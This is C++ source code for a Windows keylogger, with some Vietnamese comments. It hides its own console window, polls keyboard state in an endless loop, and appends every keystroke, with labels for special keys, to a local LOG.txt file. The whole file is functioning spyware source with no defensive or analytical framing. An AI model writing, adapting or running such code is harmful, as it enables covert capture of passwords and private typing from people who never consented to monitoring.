#include <iostream>
using namespace std;
#include <windows.h>
#include <winuser.h>
int Save (int key_stroke, char *file);
void Stealth();
int main(){
Stealth();
char i;
while (1){
  for(i = 8; i <= 190; i++){
    if (GetAsyncKeyState(i) == -32767)
      Save (i,"LOG.txt");
             }
        }
       system ("PAUSE");
    return 0;
}

/* *********************************** */

int Save (int key_stroke, char *file)
{
if ( (key_stroke == 1) || (key_stroke == 2) )
return 0;

FILE *OUTPUT_FILE;
OUTPUT_FILE = fopen(file, "a+");

cout << key_stroke << endl;
                                         /*********MENU-KEY*********/
if (key_stroke == 8)                                /*       PHÍM XÓA        */
fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
else if (key_stroke == 13)                          /*     ENTER           */
fprintf(OUTPUT_FILE, "%s", "\n");
else if (key_stroke == 32)                          /*   PHÍM CÁCH       */
fprintf(OUTPUT_FILE, "%s", "__"); 
else if (key_stroke == VK_TAB)                      /*   PHÍM TAB      */
fprintf(OUTPUT_FILE, "%s", "[TAB]");
else if (key_stroke == VK_SHIFT)                    /*   SHILF       */
fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
else if (key_stroke == VK_CONTROL)
fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
else if (key_stroke == VK_MENU)
fprintf(OUTPUT_FILE, "%s", "[ALT]");
else if (key_stroke == VK_ESCAPE)
fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
else if (key_stroke == VK_END)
fprintf(OUTPUT_FILE, "%s", "[END]");
else if (key_stroke == VK_HOME)
fprintf(OUTPUT_FILE, "%s", "[HOME]");
else if (key_stroke == VK_CAPITAL)
fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
else if (key_stroke == VK_SPACE)
fprintf(OUTPUT_FILE, "%s", "[SPACEBAR]");            /*   PHÍM CÁCH   */
else if (key_stroke == VK_DELETE)
fprintf(OUTPUT_FILE, "%s", "[DEL]"); 
/////////BUTTON////
else if (key_stroke == VK_LEFT)
fprintf(OUTPUT_FILE, "%s", "[LEFT]");
else if (key_stroke == VK_UP)
fprintf(OUTPUT_FILE, "%s", "[UP]");
else if (key_stroke == VK_RIGHT)
fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
else if (key_stroke == VK_DOWN)
fprintf(OUTPUT_FILE, "%s", "[DOWN]");
else if (key_stroke == 190 || key_stroke == 110)
fprintf(OUTPUT_FILE, "%s", ".");
else
fprintf(OUTPUT_FILE, "%s", &key_stroke);

fclose (OUTPUT_FILE);
return 0;
}

/* *********************************** */

void Stealth()
{
HWND Stealth;
AllocConsole();
Stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(Stealth,0);
}
